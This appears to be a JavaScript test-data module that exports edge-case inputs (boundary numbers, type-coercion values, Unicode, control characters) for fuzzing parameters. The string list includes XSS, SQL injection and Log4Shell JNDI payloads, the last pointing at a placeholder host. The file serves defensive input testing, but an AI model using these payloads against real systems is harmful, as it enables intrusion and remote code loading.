// const datainputconfigs = {

//     "int": [-1, 0, 1,""," "],
//         "float": [-1.0, 0, 1.0," "," ",[1.0,-1,0]],
//             "string": ["", " ", 0,12,"\0"]

// }
const datainputconfigs = {
    "int": [
        // Boundary values
        Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER, 
        // JavaScript number quirks
        NaN, Infinity, -Infinity, -0,
        // Different base representations (Hex, Binary, Octal)
        0xFF, 0b1010, 0o755,
        // Strings that look like integers
        "007", "+42", "-0", "  42  ", "42px",
        // Type coercion tests (what happens if the parser gets non-numbers?)
        null, undefined, true, false,
        // Structural coercion
        [], [5], [1, 2], {}
    ],
    "float": [
        // Boundary values
        Number.MAX_VALUE, Number.MIN_VALUE, Number.EPSILON,
        // Scientific notation
        1e-10, 1.2e5, -2.5e-3,
        // Syntax edge cases
        .5, -.75, 0.000000000000001,
        // JS quirks
        NaN, Infinity, -Infinity,
        // Strings that look like floats or contain multiple separators
        "3.14.15", "1,234.56", ".99", "1e3",
        // Mathematical constants
        Math.PI,
        // Coercion attempts
        [1.5], null, false
    ],
    "string": [
        // Control characters and excessive whitespace
        " \n \t \r \v \f ", "\0", "\u0000\u0001\u0002",
        // Strings that represent other types (often fools loose equality checks)
        "null", "undefined", "NaN", "true", "false", "0",
        // Complex Unicode, Zalgo text, and Emojis (tests byte-length vs character-length)
        "👨‍👩‍👧‍👦", "H̸̡̪̯ͨ͊̽̅̾̎Ȩ̬̩̾͛ͪ̈́̀́͘ ̶̧̨̱̹̭̯ͧ̾ͬC̷̙̲̝͖ͭ̏ͥͮ͟Oͮ͏̮̪̝͍M̲̖͊̒ͪͩͬ̚̚͜Ȇ̴̟̟͙̞ͩ͌͝S̨̥̫͎̭ͯ̿̔̀ͅ", "こんにちは",
        // Common injection payloads (Security testing)
        "<script>alert(1)</script>", "\"' OR 1=1 --", "${jndi:ldap://fake.com/a}",
        // Formatted strings
        '{"key": "value", "arr": [1,2,3]}', "name@email.com",
        // Extreme length (using a method to generate instead of hardcoding)
        // Coercion attempts (passing non-strings to a string parameter)
        null, undefined, 12345, []
    ]
}

export { datainputconfigs };